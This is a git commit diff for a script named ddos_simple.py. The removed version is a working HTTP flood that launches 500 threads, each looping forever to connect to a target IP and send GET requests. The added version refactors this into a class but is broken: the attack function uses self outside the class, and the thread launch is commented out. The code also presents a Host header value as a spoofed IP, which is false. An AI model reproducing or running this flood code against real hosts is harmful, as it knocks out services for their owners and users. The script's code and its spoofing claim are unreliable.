860b0287c43b138f4c4c415afd3772d9d46a91fa
LarsRosenkilde <50791042+LarsRosenkilde@users.noreply.github.com>
2021-04-13 08:05:02 +0200

    Update ddos_simple.py

--- ddos_simple.py
+++ ddos_simple.py
@@ -1,21 +1,23 @@
-
 import threading
 import socket
 
-target = "192.168.8.1"
-port = 80
-fake_ip = "182.21.20.32"
 
-
-def ddos():
+class DenialOfService(object):
+    def __init__(self, target="192.168.8.1", port=80, ip_mask="182.21.20.32"):
+        self.target = target
+        self.port = port
+        self.ip_mask = ip_mask
+        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+def attatck():
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
-        s.sendto((f"Host: {fake_ip}\r\n\r\n").encode("ascii"), (target, port))
-        s.close()
+        self.con.connect((self.target, self.port))
+        self.con.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
+        self.con.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
+        self.con.close()
 
-for i in range(500):
-    thread = threading.Thread(target=ddos)
-    thread.start()
+
+# for i in range(500):
+#     thread = threading.Thread(target=ddos)
+#     thread.start()
 
